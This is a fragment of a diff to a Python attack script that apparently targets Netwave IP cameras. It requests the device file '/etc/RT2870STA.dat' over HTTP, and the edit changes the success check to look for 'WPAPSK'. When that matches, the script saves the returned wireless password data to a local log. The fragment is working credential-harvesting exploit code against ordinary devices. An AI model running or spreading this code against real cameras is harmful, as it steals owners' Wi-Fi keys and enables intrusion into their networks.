@@ -21,7 +21,7 @@ def grab_file (IP,PORT):
 		print ("[*] Testing: "+IP+" on Port: "+PORT+" [*]")
 		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}
 		response = session.get("http://"+IP+":"+PORT+"//etc/RT2870STA.dat", headers=headers, timeout=15)
-		if '[Default]' in response.text:
+		if 'WPAPSK' in response.text:
 			print ("[*] Got Password File ... Logging to file. [*]")
 			text_file = open(""+IP+" - netwave.txt", "a")
 			text_file.write(""+response.text+"\n")
